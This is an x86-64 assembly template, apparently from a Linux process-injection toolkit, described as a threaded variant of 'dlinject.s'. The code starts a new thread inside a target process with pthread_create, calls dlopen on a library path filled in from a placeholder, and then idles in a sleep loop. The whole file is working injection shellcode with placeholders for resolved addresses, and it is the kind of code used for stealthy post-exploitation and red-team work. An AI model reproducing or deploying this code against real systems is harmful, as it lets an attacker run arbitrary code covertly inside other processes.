# Threaded version of dlinject.s
# Same caveats as execute_precompiled_threaded.s

jmp post_load_library

load_library:
	// BEGIN: call dlopen() against the specified library
	push r14
	lea rdi, library_path[rip]
    mov rsi, 2              # mode (RTLD_NOW)
	mov rdx, [BASEADDRESS:.+/libdl-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:dlopen@@GLIBC.+:RELATIVEOFFSET]
	xor rcx, rcx
    mov r9, rdx
	call r9
	pop r14
	// END: call dlopen()
forever_loop:
	mov rbx, 10
	mov rcx, 10
	mov r13, rsp
	// sleep [VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE] second(s)
	mov rax, 35

	push r15
	push r14
	push r13
	push r11
	
	mov rdi, r13

	lea rsi, [rbp]
	xor rsi, rsi
	syscall
	
	pop r11
	pop r13
	pop r14
	pop r15
	
	jmp forever_loop

post_load_library:
	mov rcx, 0
	lea rax, load_library[rip]
	mov rdx, rax
	mov rsi, 0
	mov rax, arbitrary_read_write_data_address[rip]
	add rax, 0x1000		# don't overwrite anything important
	mov rdi, rax
	mov r9, [BASEADDRESS:.+/libpthread-[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:pthread_create@@.+:RELATIVEOFFSET]
	call r9
	
[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
	
# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"
